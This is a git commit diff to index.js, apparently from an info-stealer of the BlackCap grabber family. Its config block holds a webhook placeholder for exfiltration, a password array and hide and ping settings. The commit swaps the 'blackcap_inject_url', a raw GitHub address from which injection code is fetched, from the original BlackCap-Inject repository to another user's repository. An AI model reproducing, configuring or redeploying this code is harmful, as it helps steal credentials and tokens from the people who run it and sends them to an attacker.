268e462fb7fe4e2abd33ce3678081c98639a557e
GrrOnGithub <88559114+GrrOnGithub@users.noreply.github.com>
2023-03-24 14:36:09 +0100

    Update index.js

--- index.js
+++ index.js
@@ -54,7 +54,7 @@ Passw = [];
 
 __config__ = {
     'yourwebhookurl': "%WEBHOOK_HERE%",
-    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    'blackcap_inject_url': "https://raw.githubusercontent.com/GrrOnGithub/weems/main/index.js",
     'hide': '%_hide_script%',
     'ping': '%ping_enabled%',
     'pingtype': '%ping_type%',
